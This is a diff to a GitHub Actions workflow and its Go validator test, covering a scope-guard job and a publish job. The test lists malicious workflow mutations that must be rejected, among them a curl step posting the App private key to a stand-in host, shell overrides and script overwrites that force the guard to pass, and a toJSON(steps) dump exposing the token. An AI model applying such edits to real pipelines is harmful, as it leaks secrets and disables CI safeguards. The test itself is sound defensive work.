@@ -1330,6 +1330,7 @@ jobs:
           name: upstream-refresh-candidate
           path: ${{ runner.temp }}/candidate
       - id: guard
+        shell: bash --noprofile --norc -euo pipefail {0}
         continue-on-error: true
         run: |
           ./scripts/ci/upstream-refresh-scope-guard.sh "${RUNNER_TEMP}/candidate/patch"
@@ -1380,13 +1381,13 @@ func TestValidateUpstreamRefreshWorkflowRejectsMutations(t *testing.T) {
 		{"scope-guard result forged", "result: ${{ steps.guard.outcome == 'success' && 'passed' || 'failed' }}", "result: passed", "must export result from the guard step outcome"},
 		{"scope-guard result from step output", "result: ${{ steps.guard.outcome == 'success' && 'passed' || 'failed' }}", "result: ${{ steps.guard.outputs.result }}", "must export result from the guard step outcome"},
 		{"scope-guard failure masked", "          ./scripts/ci/upstream-refresh-scope-guard.sh \"${RUNNER_TEMP}/candidate/patch\"", "          ./scripts/ci/upstream-refresh-scope-guard.sh \"${RUNNER_TEMP}/candidate/patch\" || true\n          echo result=passed >> \"${GITHUB_OUTPUT}\"", "scope-guard job must run the scope guard as its only run step"},
-		{"scope-guard shell override", "      - id: guard\n", "      - id: guard\n        shell: sh -c 'exit 0' {0}\n", "scope-guard job must run the scope guard as its only run step"},
+		{"scope-guard shell override", "        shell: bash --noprofile --norc -euo pipefail {0}\n        continue-on-error", "        shell: sh -c 'exit 0' {0}\n        continue-on-error", "scope-guard job must run the scope guard as its only run step"},
 		{"scope-guard second run step", "      - id: guard\n", "      - run: echo 'exit 0' > ./scripts/ci/upstream-refresh-scope-guard.sh\n      - id: guard\n", "reviewed checkout, candidate download"},
 		{"scope-guard renamed step", "      - id: guard\n", "      - id: check\n", "scope-guard job must run the scope guard as its only run step"},
 		{"publish contents write", "      contents: read\n      issues: write\n    steps:\n      - id: app-token", "      contents: write\n      issues: write\n    steps:\n      - id: app-token", "publish job must grant exactly"},
 		{"publish missing environment", "    environment:\n      name: upstream-refresh\n", "", "publish job must bind the upstream-refresh environment"},
 		{"scope-guard checkout from another repository", "          persist-credentials: false\n      - uses: actions/download", "          persist-credentials: false\n          repository: evil/other\n      - uses: actions/download", "reviewed checkout, candidate download"},
-		{"scope-guard extra action step", "      - id: guard\n        continue-on-error: true", "      - uses: actions/checkout@abc\n      - id: guard\n        continue-on-error: true", "reviewed checkout, candidate download"},
+		{"scope-guard extra action step", "      - id: guard\n", "      - uses: actions/checkout@abc\n      - id: guard\n", "reviewed checkout, candidate download"},
 		{"refresh publishes behind a line continuation", "          gh issue create --title \"Upstream refresh candidate\"", "          gh pr \\\n            create --fill\n          gh issue create --title \"Upstream refresh candidate\"", "must not contain \"gh pr create\""},
 		{"refresh merges behind a line continuation", "          gh issue create --title \"Upstream refresh candidate\"", "          gh pr \\\n            merge 1\n          gh issue create --title \"Upstream refresh candidate\"", "must not contain \"gh pr merge\""},
 		{"publish missing scope-guard need", "needs: [refresh, scope-guard]", "needs: [refresh]", "publish job must need exactly"},
@@ -1399,11 +1400,12 @@ func TestValidateUpstreamRefreshWorkflowRejectsMutations(t *testing.T) {
 		{"publish step uses the bracket token form", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n      - env:\n          GH_TOKEN: ${{ steps['app-token'].outputs.token }}\n        run: gh pr merge 1\n", "App token only in the publish script step"},
 		{"publisher step gains an env", "          SCOPE_GUARD_RESULT: ${{ needs.scope-guard.outputs.result }}\n", "          SCOPE_GUARD_RESULT: ${{ needs.scope-guard.outputs.result }}\n          X: y\n", "must run only the publish script"},
 		{"presence step leaks the private key", "      - id: app-token\n", "      - id: secrets\n        env:\n          APP_CLIENT_ID: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_CLIENT_ID }}\n          APP_PRIVATE_KEY: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY }}\n        run: curl -d \"${APP_PRIVATE_KEY}\" https://example.invalid\n      - id: app-token\n", "App token only in the publish script step"},
-		{"scope-guard loses continue-on-error", "      - id: guard\n        continue-on-error: true\n", "      - id: guard\n", "scope-guard job must run the scope guard as its only run step"},
+		{"scope-guard loses continue-on-error", "        continue-on-error: true\n", "", "scope-guard job must run the scope guard as its only run step"},
 		{"publish job env holds the private key", "    environment:\n      name: upstream-refresh\n", "    environment:\n      name: upstream-refresh\n    env:\n      K: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY }}\n", "not set App credentials at workflow or job level"},
 		{"workflow env holds the private key", "env:\n  WORKCELL_COSIGN_VERSION: v3.0.6\n", "env:\n  WORKCELL_COSIGN_VERSION: v3.0.6\n  K: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY }}\n", "not set App credentials at workflow or job level"},
 		{"publisher drops its shell pin", "      - shell: bash --noprofile --norc -euo pipefail {0}\n        env:", "      - env:", "must run only the publish script"},
 		{"publish replaces the script before running it", "      - shell: bash --noprofile --norc -euo pipefail {0}\n        env:", "      - run: echo x > scripts/ci/upstream-refresh-publish.sh\n      - shell: bash --noprofile --norc -euo pipefail {0}\n        env:", "must not run other steps before the publish script"},
+		{"publish step reads the whole steps context", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n      - env:\n          T: ${{ toJSON(steps) }}\n        run: echo\n", "App token only in the publish script step"},
 		{"publish hard-codes the guard result", "candidate \"${SCOPE_GUARD_RESULT}\" audit.md", "candidate passed audit.md", "second publish script argument"},
 		{"publish ignores scope-guard result", "SCOPE_GUARD_RESULT: ${{ needs.scope-guard.outputs.result }}", "SCOPE_GUARD_RESULT: passed", "must pass the scope-guard result"},
 		{"publish App token from wrong secret", "client-id: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_CLIENT_ID }}", "client-id: ${{ secrets.OTHER }}", "client-id secret"},
